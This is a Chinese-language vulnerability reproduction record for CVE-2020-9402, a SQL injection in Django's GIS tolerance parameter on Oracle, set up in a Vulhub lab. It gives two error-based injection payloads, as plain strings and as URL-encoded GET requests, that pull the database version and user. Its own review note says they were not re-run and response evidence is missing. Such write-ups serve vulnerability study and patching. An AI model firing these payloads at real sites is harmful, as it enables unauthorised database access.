---
cve: "CVE-2020-9402"
source: "白阁文库 BaizeSec/bylibrary"
product: "Django GIS Oracle tolerance SQLi"
record_type: "vulnerability"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
primary_identifiers: "CVE-2020-9402"
referenced_identifiers: ""
identifier_role: "primary"
identifier_status: "unknown"
title: "Django GIS SQL注入漏洞复现"
prerequisites: "来源所述条件，未列明部分仍待核：1.11<1.11.29,2.2<2.2.11,3.0<3.0.4; Oracle prerequisite absent"
side_effects: "未执行；原文未提供完整的状态变化与恢复证据，实际操作影响按本文入口、进程权限和实验条件核对"
source_status: "unknown"
id: "vw-19518bc87c881f5565d3f509"
entity_id: "ve-19518bc87c881f5565d3f509"
schema_version: "1"
---

## 核对与使用边界

本文已按保存的全文审阅记录进行文字校订；本轮仅静态核对，未运行 PoC、请求目标或逐图验证。

适用条件与版本记录（来源主张，未列为明确更正的部分仍待权威资料核对）：1.11&lt;1.11.29,2.2&lt;2.2.11,3.0&lt;3.0.4; Oracle prerequisite absent

代码与实验材料：Same2 payloads as32; stray1 lines and no response after 查询报错

来源证据范围：Vulhub exact CVE path; bylibrary attribution

- **证据待核（1）**：Missing response evidence and Oracle/tolerance prerequisites。保留原引用、截图位置和实验叙述；本项所缺材料未被补造，截图存在或作者宣称成功都不等于已核验其内容。

历史原文标识：下文原技术材料按来源保留；仅本节明确确认的更正替代相应旧说法，标为待核的观察仍不是事实确认。

# Django GIS SQL注入漏洞复现

### Django GIS SQL注入漏洞复现

## 漏洞详情

Django是Django基金会的一套基于Python语言的开源Web应用框架。该框架包括面向对象的映射器、视图系统、模板系统等。  Django  1.11.29之前的1.11.x版本、2.2.11之前的2.2.x版本和3.0.4之前的3.0.x版本中存在SQL注入漏洞。攻击者可借助特制的SQL语句利用该漏洞查看、添加、修改或删除数据库中的信息。

## 漏洞环境

[环境搭建](https://github.com/vulhub/vulhub/blob/master/django/CVE-2020-9402)，环境启动后，访问http://your-ip:8000即可看到Django默认首页。

## 漏洞复现

payload1：
 访问http://your-ip:8000/vuln/，在该网页中使用get方法构造q的参数，构造SQL注入的字符串`20) = 1 OR (select utl_inaddr.get_host_name((SELECT version FROM v$instance)) from dual) is null OR (1+1`

payload2：
 访问http://your-ip:8000/vuln2/。 在该网页中使用get方法构造q的参数，构造出SQL注入的字符串`0.05))) FROM "VULN_COLLECTION2" where (select utl_inaddr.get_host_name((SELECT user FROM DUAL)) from dual) is not null --`

```bash
http://your-ip:8000/vuln/?q=20)%20%3D%201%20OR%20(select%20utl_inaddr.get_host_name((SELECT%20version%20FROM%20v%24instance))%20from%20dual)%20is%20null%20%20OR%20(1%2B1
1
http://your-ip:8000/vuln2/?q=0.05)))%20FROM%20%22VULN_COLLECTION2%22%20%20where%20%20(select%20utl_inaddr.get_host_name((SELECT%20user%20FROM%20DUAL))%20from%20dual)%20is%20not%20null%20%20--
1
```

可见，括号已注入成功，SQL语句查询报错：


---

> 来源：白阁文库 BaizeSec/bylibrary
